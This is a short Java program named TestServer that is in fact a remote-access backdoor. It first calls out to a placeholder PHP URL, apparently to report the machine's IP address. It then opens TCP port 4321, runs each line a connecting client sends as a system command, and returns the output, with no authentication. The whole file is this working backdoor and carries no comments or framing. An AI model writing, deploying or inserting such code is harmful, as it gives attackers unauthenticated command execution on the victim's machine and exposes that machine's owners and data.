import java.net.*;
import java.io.*;

public class TestServer
{
   public static void main(String args[])
   {
   
  URL url;
      HttpURLConnection conn;
      BufferedReader rd;
   try {
         url = new URL("http://ip-address-of-webserver-with-php-script/ip.php");
         conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("GET");
         rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
         rd.close();
      } catch (Exception e) {      }
   
      ServerSocket server = null;
      try 
      {
         server = new ServerSocket(4321);
      }
      catch (IOException e) 
      {
         System.exit(1);
      }
      Socket client = null;
      try 
      {
         client = server.accept();
      } 
      catch (IOException e) 
      {
         System.exit(1);
      }
      try
      {
         DataInputStream streamIn = new DataInputStream(new BufferedInputStream(client.getInputStream()));
         PrintWriter socketOut = new PrintWriter(client.getOutputStream(), true);
         boolean done = false;
         String line;
         while (!done)
         {
            	line = streamIn.readLine();
            	try 
            	{ 
			Process p = Runtime.getRuntime().exec(line);
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); 
			String line2 = "";
			String op = "";
			while ((line2 = reader.readLine()) != null)
			{
				op = op + line2 + "----";
			}
			socketOut.println(op);
	    	}
		catch(Exception e1)
		{
			
		}
		if(line.equals("bye"))
			done = true;
         }
         streamIn.close();
         client.close();
         server.close();
      }
      catch(IOException e)
      {  }
   }
}
